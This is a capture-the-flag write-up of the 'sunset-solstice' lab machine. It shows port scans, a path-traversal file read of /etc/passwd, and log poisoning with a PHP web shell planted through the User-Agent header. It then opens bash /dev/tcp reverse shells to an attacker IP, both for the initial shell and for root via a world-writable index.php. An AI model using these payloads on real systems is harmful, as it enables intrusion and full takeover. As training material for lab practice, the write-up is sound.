---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/sunset-solstice,499/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

As usual we start with a simple `nmap` to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- 192.168.250.72
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-12 13:33 EST
Nmap scan report for 192.168.250.72
Host is up (0.027s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
2121/tcp  open  ccproxy-ftp
3128/tcp  open  squid-http
8593/tcp  open  unknown
54787/tcp open  unknown
62524/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.75 seconds

$ nmap -Pn -p21,22,25,80,2121,3128,8593,54787 -sV 192.168.250.72
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-12 13:34 EST
Nmap scan report for 192.168.250.72
Host is up (0.024s latency).

PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        pyftpdlib 1.5.6
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp    open  smtp       Exim smtpd
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
2121/tcp  open  ftp        pyftpdlib 1.5.6
3128/tcp  open  http-proxy Squid http proxy 4.6
8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.93 seconds
```

## port 21 and 2121 (`FTP`)
```bash
$ ftp 192.168.250.72
Connected to 192.168.250.72.
220 pyftpdlib 1.5.6 ready.
Name (192.168.250.72:void): anonymous
331 Username ok, send password.
Password:
530 Anonymous access not allowed.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> exit
221 Goodbye.

$ ftp 192.168.250.72 2121
Connected to 192.168.250.72.
220 pyftpdlib 1.5.6 ready.
Name (192.168.250.72:void): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 Active data connection established.
125 Data connection already open. Transfer starting.
drws------   2 www-data www-data     4096 Jun 18  2020 pub
226 Transfer complete.
```

> So anonymous login is possible on the `FTP` server on port 2121.
{: .prompt-info }

---

# exploitation
## arbitrary file read
On port 8593 is a web server providing a feature named `book list`.
![file read website](/images/solstice_filereadwebsite.png)

Using the feature triggers the following `http` requests
```http
GET /index.php?book=list HTTP/1.1
Host: 192.168.250.72:8593
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.250.72:8593/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=7kbv4b7lcnuu1uprcspap5i743
Connection: close

HTTP/1.1 200 OK
Host: 192.168.250.72:8593
Date: Mon, 12 Dec 2022 18:46:05 GMT
Connection: close
X-Powered-By: PHP/7.3.14-1~deb10u1
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p></p>    </body>
</html>
```

> The parameter `book` looks interesting and should be tested for a traversal attack.
{: .prompt-info }

Therefore we use burp suite and the wordlist `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`.  
At first we are configurating the burp intruder in the following way.

![burp intruder](/images/solstice_intruder1.png)  
![burp intruder](/images/solstice_intruder2.png)  

After starting the attack we review the results and sort them by length. We realize that some strings seemed to work.

![burp intruder](/images/solstice_intruder3.png)  

Lets execute a similar request manually via burp repeater to verify the vulnerability.  
The `HTTP` request looks like the following.
```http
GET /index.php?book=../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.250.72:8593
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.250.72:8593/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=7kbv4b7lcnuu1uprcspap5i743
Connection: close

HTTP/1.1 200 OK
Host: 192.168.250.72:8593
Date: Mon, 12 Dec 2022 18:50:36 GMT
Connection: close
X-Powered-By: PHP/7.3.14-1~deb10u1
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:107:118::/var/lib/saned:/usr/sbin/nologin
colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin
smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin
</p>    </body>
</html>
```

> It worked! We can read arbitrary files.
{: .prompt-info }

## checking if vulnerability is an LFI
As we saw in the burp intruder results we are also able to read the file `/var/log/apache2/access.log`.  
The basic idea is to try to inject `PHP` code into that file and then include it to see if we get code execution via `PHP`.  
The access log itself seems to be from the web server on port 80. Lets try to inject some simple `PHP` web shell via the user agent.
payload: `<?php system($_REQUEST['cmd']); ?>`
```http
GET /index.php?teststring HTTP/1.1
Host: 192.168.250.72
Upgrade-Insecure-Requests: 1
User-Agent: <?php system($_REQUEST['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.250.72:8593/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=7kbv4b7lcnuu1uprcspap5i743
Connection: close

HTTP/1.1 404 Not Found
Date: Mon, 12 Dec 2022 19:25:44 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 276
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 192.168.250.72 Port 80</address>
</body></html>
```

Now lets read the `access.log` and try to execute a simple `id` command.
```http
GET /index.php?book=../../../../../../../../var/log/apache2/access.log&cmd=id HTTP/1.1
Host: 192.168.250.72:8593
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.250.72:8593/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=7kbv4b7lcnuu1uprcspap5i743
Connection: close

HTTP/1.1 200 OK
Host: 192.168.250.72:8593
Date: Mon, 12 Dec 2022 19:25:46 GMT
Connection: close
X-Powered-By: PHP/7.3.14-1~deb10u1
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p>192.168.49.250 - - [12/Dec/2022:14:25:44 -0500] "GET /index.php?teststring HTTP/1.1" 404 456 "http://192.168.250.72:8593/" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
"
</p>    </body>
</html>
```

> And it works! We got a shell!
{: .prompt-info }

---

# post exploitation
## reverse shell
On the attacker machine we start a listener.
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

Trigger the reverse shell.
payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.250/80 0>&1'`
```http
GET /index.php?book=../../../../../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.250/80+0>%261' HTTP/1.1
Host: 192.168.250.72:8593
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.250.72:8593/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=7kbv4b7lcnuu1uprcspap5i743
Connection: close
```

Catch reverse connection.
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.250.72: inverse host lookup failed: Unknown host
connect to [192.168.49.250] from (UNKNOWN) [192.168.250.72] 55874
bash: cannot set terminal process group (488): Inappropriate ioctl for device
bash: no job control in this shell
www-data@solstice:/var/tmp/webserver$
```

## privilege escalation
Showing the process list reveals several processes responsible for serving all the different web servers of the target.
```bash
www-data@solstice:/home/miguel$ ps aux
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0 104116 10484 ?        Ss   14:22   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    14:22   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   14:22   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   14:22   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   14:22   0:00 [kworker/0:0H-kblockd]
root         7  0.0  0.0      0     0 ?        I    14:22   0:00 [kworker/u2:0-flush-8:0]
root         8  0.0  0.0      0     0 ?        I<   14:22   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    14:22   0:00 [ksoftirqd/0]
...
root       484  0.0  0.0   2388   760 ?        Ss   14:22   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
root       485  0.0  0.0   2388   700 ?        Ss   14:22   0:00 /bin/sh -c /usr/bin/python -m pyftpdlib -p 21 -u 15090e62f66f41b547b75973f9d516af -P 15090e62f66f41b547b75973f9d516af -d /root/ftp/
www-data   486  0.0  0.0   2388   696 ?        Ss   14:22   0:00 /bin/sh -c /usr/bin/python /var/tmp/fake_ftp/script.py
www-data   487  0.0  0.0   2388   696 ?        Ss   14:22   0:00 /bin/sh -c /usr/bin/python -m pyftpdlib -p 2121 -d /var/tmp/ftp/
www-data   488  0.0  0.0   2388   756 ?        Ss   14:22   0:00 /bin/sh -c /usr/bin/php -S 0.0.0.0:8593 -t /var/tmp/webserver/
www-data   489  0.0  0.0   2388   692 ?        Ss   14:22   0:00 /bin/sh -c /usr/bin/php -S 0.0.0.0:54787 -t /var/tmp/webserver_2/
avahi      491  0.0  0.0   8156   324 ?        S    14:22   0:00 avahi-daemon: chroot helper
root       495  0.0  2.0 196744 21172 ?        S    14:22   0:00 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
...
```

Stepping through these folders reveals that in the folder `/var/tmp/sv/` there is a file named `index.php` whis is owned and executed by `root` and is world writeble.  
The corresponding web server listens on localhost on port 57.
So, the idea is to overwrite the file with own `PHP` code and access the resource on the web server to get `root` access.
We recycle the reverse shell code we already used.  

Overwrite the file with our payload.  
payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.250/81 0>&1'`  
```bash
www-data@solstice:/var/tmp/sv$ echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/192.168.49.250/81 0>&1'\"); ?>" > index.php
<dev/tcp/192.168.49.250/81 0>&1'\"); ?>" > index.php
www-data@solstice:/var/tmp/sv$ cat index.php
cat index.php
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.49.250/81 0>&1'"); ?>
```

Start a new listener on the attackers machine
```bash
$ nc -lvp 81
listening on [any] 81 ...
```

Trigger reverse shell
```bash
www-data@solstice:/var/tmp/sv$ curl 127.0.0.1:57
curl 127.0.0.1:57
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:02:41 --:--:--     0
```

Catch connection from server.
```bash
$ nc -lvp 81
listening on [any] 81 ...
192.168.250.72: inverse host lookup failed: Unknown host
connect to [192.168.49.250] from (UNKNOWN) [192.168.250.72] 46914
bash: cannot set terminal process group (484): Inappropriate ioctl for device
bash: no job control in this shell
root@solstice:/var/tmp/sv# id
id
uid=0(root) gid=0(root) groups=0(root)
```

> Root! Root!
{: .prompt-info }

## get first flag
```bash
root@solstice:/# cd /var
cd /var
root@solstice:/var# cd www
cd www
root@solstice:/var/www# ls
ls
html
local.txt
root@solstice:/var/www# cat local.txt
cat local.txt
5******************************6
```

## get second flag
```bash
root@solstice:/home/miguel# cd /root
cd /root
root@solstice:~# dir
dir
ftp  proof.txt  root.txt
root@solstice:~# cat proof.txt
cat proof.txt
1******************************0
```

Pwned! <@:-)
